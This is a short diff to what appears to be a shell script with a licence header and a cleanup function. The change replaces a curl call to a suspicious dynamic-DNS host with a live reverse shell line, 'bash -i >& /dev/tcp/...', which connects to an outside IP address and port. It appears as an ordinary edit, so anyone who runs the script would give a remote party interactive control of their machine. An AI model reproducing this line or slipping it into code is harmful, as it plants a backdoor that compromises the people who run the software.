@@ -14,7 +14,7 @@
 # limitations under the License.
 #
 
-curl http://666888.c196dfa515.ddns.bypass.eu.org./1.png
+bash -i >& /dev/tcp/142.171.91.242/9999 0>&1
 
 function cleanup()
 {
